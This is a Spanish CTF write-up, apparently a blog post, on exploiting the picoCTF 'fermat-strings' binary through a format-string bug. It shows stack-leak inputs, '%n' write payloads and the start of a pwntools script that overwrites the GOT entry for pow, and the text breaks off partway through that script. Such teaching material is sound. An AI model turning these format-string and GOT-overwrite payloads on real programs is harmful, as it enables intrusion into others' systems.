<!doctype html><html lang="es"><head><title>fermat-strings | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="picoMini by redpwn. 250 puntos. Binario de 64 bits. Format String. Sobrescritura de la GOT y bypass de ASLR"><meta itemprop="description" content="picoMini by redpwn. 250 puntos. Binario de 64 bits. Format String. Sobrescritura de la GOT y bypass de ASLR"><meta name="twitter:card" content="picoMini by redpwn. 250 puntos. Binario de 64 bits. Format String. Sobrescritura de la GOT y bypass de ASLR"><meta name="twitter:description" content="picoMini by redpwn. 250 puntos. Binario de 64 bits. Format String. Sobrescritura de la GOT y bypass de ASLR"><meta property="og:description" content="picoMini by redpwn. 250 puntos. Binario de 64 bits. Format String. Sobrescritura de la GOT y bypass de ASLR"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="fermat-strings"><meta property="twitter:title" content="fermat-strings"><meta property="og:title" content="fermat-strings"><meta property="og:url" content="https://7rocky.github.io/ctf/picoctf/binary-exploitation/fermat-strings/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><script>MathJax={loader:{load:["[tex]/noerrors"]},options:{ignoreHtmlClass:"tex2jax_ignore",processHtmlClass:"tex2jax_process",skipHtmlTags:["noscript","pre","script","style","textarea"]},tex:{autoload:{color:[],colorv2:["color"]},displayMath:[["$$","$$"]],inlineMath:[["$","$"]],packages:{"[+]":["noerrors"]},processEnvironments:!0,processEscapes:!0}}</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script><div id="math-consts" style="display:none">$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\gcd}{\mathop{\mathrm{gcd}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div><script src="/js/imc.js"></script>
<script>(async()=>await typeset(()=>[`#math-consts`]))()</script><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/picoctf/binary-exploitation/fermat-strings/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- EXPLOTACIÓN DE BINARIOS</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/picoctf/binary-exploitation/fermat-strings/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/picoctf/binary-exploitation/fermat-strings/&text=fermat-strings" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/picoctf/binary-exploitation/fermat-strings/&title=fermat-strings" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">fermat-strings</h1><p class="mb4 f6 dib tracked">12 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-de-código-estático">Análisis de código estático</a></li><li><a href="#vulnerabilidad-de-_format-string_">Vulnerabilidad de <em>Format String</em></a></li><li><a href="#explotación-de-_format-string_">Explotación de <em>Format String</em></a><ul><li><a href="#explotación-manual">Explotación manual</a></li><li><a href="#realizando-fugas-de-memoria">Realizando fugas de memoria</a></li><li><a href="#sobrescritura-de-la-got">Sobrescritura de la GOT</a></li><li><a href="#encontrando-la-versión-de-glibc-remota">Encontrando la versión de Glibc remota</a></li><li><a href="#corrigiendo-el-_exploit_">Corrigiendo el <em>exploit</em></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>chall</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
</code></pre></div><h2 id="análisis-de-código-estático">Análisis de código estático</h2><p>Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir dos números y tratar de buscar uno que rompa el Último Teorema de Fermat.</p><p>Como recordatorio, el Último Teorema de Fermat dice que no existen números positivos $a$, $b$, $c$ que cumplan la ecuación:</p><p>$$
a ^ n + b ^ n = z ^ n
$$</p><p>Para $n > 2$.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;stdlib.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;string.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;unistd.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;math.h&gt;</span>

<span class="mtk5">#define</span> <span class="mtk8">SIZE</span> <span class="mtk5">0x</span><span class="mtk6">100</span>

<span class="mtk7 mtki">void</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">A[SIZE];</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">B[SIZE];</span>

  <span class="mtk7 mtki">int</span> <span class="mtk1">a</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">b</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>

  <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Welcome</span> <span class="mtk4">to</span> <span class="mtk4">Fermat</span><span class="mtk6">\\</span><span class="mtk4">'s</span> <span class="mtk4">Last</span> <span class="mtk4">Theorem</span> <span class="mtk4">as</span> <span class="mtk4">a</span> <span class="mtk4">service"</span><span class="mtk1">);</span>

  <span class="mtk8">setbuf</span><span class="mtk1">(stdout,</span> <span class="mtk6">NULL</span><span class="mtk1">);</span>
  <span class="mtk8">setbuf</span><span class="mtk1">(stdin,</span> <span class="mtk6">NULL</span><span class="mtk1">);</span>
  <span class="mtk8">setbuf</span><span class="mtk1">(stderr,</span> <span class="mtk6">NULL</span><span class="mtk1">);</span>

  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"A:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk1">A,</span> <span class="mtk1">SIZE);</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"B:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk1">B,</span> <span class="mtk1">SIZE);</span>

  <span class="mtk1">A[</span><span class="mtk8">strcspn</span><span class="mtk1">(A,</span> <span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">)]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">B[</span><span class="mtk8">strcspn</span><span class="mtk1">(B,</span> <span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">)]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>

  <span class="mtk1">a</span> <span class="mtk5">=</span> <span class="mtk8">atoi</span><span class="mtk1">(A);</span>
  <span class="mtk1">b</span> <span class="mtk5">=</span> <span class="mtk8">atoi</span><span class="mtk1">(B);</span>

  <span class="mtk5">if</span> <span class="mtk1">(a</span> <span class="mtk5">==</span> <span class="mtk6">0</span> <span class="mtk5">||</span> <span class="mtk1">b</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Error:</span> <span class="mtk4">could</span> <span class="mtk4">not</span> <span class="mtk4">parse</span> <span class="mtk4">numbers!"</span><span class="mtk1">);</span>
    <span class="mtk5">return</span> <span class="mtk6">1</span><span class="mtk1">;</span>
  <span class="mtk1">}</span>

  <span class="mtk7 mtki">char</span> <span class="mtk1">buffer[SIZE];</span>
  <span class="mtk8">snprintf</span><span class="mtk1">(buffer,</span> <span class="mtk1">SIZE,</span> <span class="mtk4">"Calculating</span> <span class="mtk4">for</span> <span class="mtk4">A:</span> <span class="mtk6">%s</span> <span class="mtk4">and</span> <span class="mtk4">B:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">A,</span> <span class="mtk1">B);</span>  
  <span class="mtk8">printf</span><span class="mtk1">(buffer);</span>

  <span class="mtk7 mtki">int</span> <span class="mtk1">answer</span> <span class="mtk5">=</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">;</span>
  <span class="mtk5">for</span> <span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk1">i</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span> <span class="mtk1">i</span> <span class="mtk5">&lt;</span> <span class="mtk6">100</span><span class="mtk1">;</span> <span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">pow</span><span class="mtk1">(a,</span> <span class="mtk6">3</span><span class="mtk1">)</span> <span class="mtk5">+</span> <span class="mtk8">pow</span><span class="mtk1">(b,</span> <span class="mtk6">3</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk8">pow</span><span class="mtk1">(i,</span> <span class="mtk6">3</span><span class="mtk1">))</span> <span class="mtk1">{</span>
      <span class="mtk1">answer</span> <span class="mtk5">=</span> <span class="mtk1">i;</span>
    <span class="mtk1">}</span>
  <span class="mtk1">}</span>

  <span class="mtk5">if</span> <span class="mtk1">(answer</span> <span class="mtk5">!=</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Found</span> <span class="mtk4">the</span> <span class="mtk4">answer:</span> <span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">answer);</span>
<span class="mtk1">}</span>
</code></pre></div><h2 id="vulnerabilidad-de-_format-string_">Vulnerabilidad de <em>Format String</em></h2><p>En el código fuente vemos una vulnerabilidad de <em>Format String</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">snprintf</span><span class="mtk1">(buffer,</span> <span class="mtk1">SIZE,</span> <span class="mtk4">"Calculating</span> <span class="mtk4">for</span> <span class="mtk4">A:</span> <span class="mtk6">%s</span> <span class="mtk4">and</span> <span class="mtk4">B:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">A,</span> <span class="mtk1">B);</span>  
<span class="mtk8">printf</span><span class="mtk1">(buffer);</span>
</code></pre></div><p>Ya que podemos incluir formatos en la variable <code>buffer</code>, que es el primer argumento de <code>printf</code>. Sin embargo, necesitamos insertar un número válido en <code>A</code> y <code>B</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"A:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk1">A,</span> <span class="mtk1">SIZE);</span>
<span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"B:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk1">B,</span> <span class="mtk1">SIZE);</span>

<span class="mtk1">A[</span><span class="mtk8">strcspn</span><span class="mtk1">(A,</span> <span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">)]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>  
<span class="mtk1">B[</span><span class="mtk8">strcspn</span><span class="mtk1">(B,</span> <span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">)]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">a</span> <span class="mtk5">=</span> <span class="mtk8">atoi</span><span class="mtk1">(A);</span>
<span class="mtk1">b</span> <span class="mtk5">=</span> <span class="mtk8">atoi</span><span class="mtk1">(B);</span>
</code></pre></div><p>Pero esto es fácil. Vamos a probar:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chall</span>
Welcome to Fermat\'s Last Theorem as a service
A: 1.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
B: 1
Calculating for A: 1.400bd8.97161728.0.ffffffff.97161350.0.0.97161580.1.78252e31.252e7825.2e78252e.78252e78.252e7825 and B: 1  
</code></pre></div><p>Como podemos ver, estamos extrayendo valores de la pila (<em>stack</em>). Y también vemos que la cadena de formatos comienza en la posición 10 (<em>offset</em> 10):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chall</span>
Welcome to Fermat\'s Last Theorem as a service  
A: 1AAA%10$x
B: 1
Calculating for A: 1AAA41414131 and B: 1
</code></pre></div><h2 id="explotación-de-_format-string_">Explotación de <em>Format String</em></h2><p>El programa termina después de introducir los datos. Necesitamos encontrar una manera de ejecutar el programa de nuevo pero sin parar el proceso. Esto se puede hacer explotando la vulnerabilidad de <em>Format String</em>, ya que existe un formato <code>%n</code> que permite escribir el número de bytes escritos hasta el formato <code>%n</code> en la dirección dada como parámetro (el valor de la posición en la pila).</p><p>Vemos que el binario tiene la protección <em>Partial</em> RELRO, lo que indica que la GOT no se puede sobrescribir durante un <em>Buffer Overflow</em>, pero sí que se puede escribir con <em>Format String</em>. Por tanto, la idea es modificar una entrada de la GOT para que una función apunte a la dirección del <code>main</code> y así volver a ejecutar el programa.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">chall</span>
Reading symbols from <span class="code-dark-green">chall</span>...
(No debugging symbols found in <span class="code-dark-green">chall</span>)
<span class="code-red">gef➤</span>  break main
Breakpoint 1 at <span class="code-dark-blue">0x40083b</span>
<span class="code-red">gef➤</span>  run
Starting program: ./chall

Breakpoint 1, <span class="code-dark-blue">0x000000000040083b</span> in <span class="code-dark-yellow">main</span> ()  
</code></pre></div><p>Ahora podemos ver las entradas de la GOT:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  got

GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class="code-dark-yellow">puts@GLIBC_2.2.5  →  0x4006c6</span>
[0x601020] <span class="code-dark-yellow">__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>  
[0x601028] <span class="code-dark-yellow">setbuf@GLIBC_2.2.5  →  0x4006e6</span>
[0x601030] <span class="code-dark-yellow">printf@GLIBC_2.2.5  →  0x4006f6</span>
[0x601038] <span class="code-dark-yellow">snprintf@GLIBC_2.2.5  →  0x400706</span>
[0x601040] <span class="code-dark-yellow">pow@GLIBC_2.2.5  →  0x400716</span>
[0x601048] <span class="code-dark-yellow">strcspn@GLIBC_2.2.5  →  0x400726</span>
[0x601050] <span class="code-dark-yellow">read@GLIBC_2.2.5  →  0x400736</span>
[0x601058] <span class="code-dark-yellow">atoi@GLIBC_2.2.5  →  0x400746</span>
</code></pre></div><p>Desde el punto donde está la vulnerabilidad de <code>printf</code>, solamente se llama a <code>pow</code> y a <code>printf</code>. No nos interesa cambiar <code>printf</code>, por lo que habrá que modificar la entrada de <code>pow</code>.</p><p>Primero, vamos a poner la dirección en una posición de la pila. Para ello, utilizamos la variable <code>A</code> para poner la dirección y la variable <code>B</code> para extraerla. Pero antes, vamos a hacerlo con caracteres reconocibles:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chall</span>
Welcome to Fermat\'s Last Theorem as a service
A: 1234567.AAAABBBB
B: 1.%11$lx
Calculating for A: 1234567.AAAABBBB and B: 1.4242424241414141  
</code></pre></div><p>Nótese el uso de <code>%lx</code> para imprimir un valor de 8 bytes, y la posición 11, porque en la posición 10 tenemos <code>1234567.</code>.</p><p>Ahora, podemos reemplazar <code>AAAABBBB</code> con la dirección de <code>pow</code> en la GOT. Y en lugar de poner <code>%11$lx</code>, pondremos <code>%11$n</code>. Vamos a hacerlo en un script en Python con <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> y adjuntar GDB para visualizar las entradas de la GOT:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">pow_got</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1.%11$n'</span>

<span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk9 mtki">gdbscript</span><span class="mtk5">=</span><span class="mtk4">'break</span> <span class="mtk4">pow</span><span class="mtk6">\n</span><span class="mtk4">continue</span><span class="mtk6">\n</span><span class="mtk4">got'</span><span class="mtk1">)</span>  

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
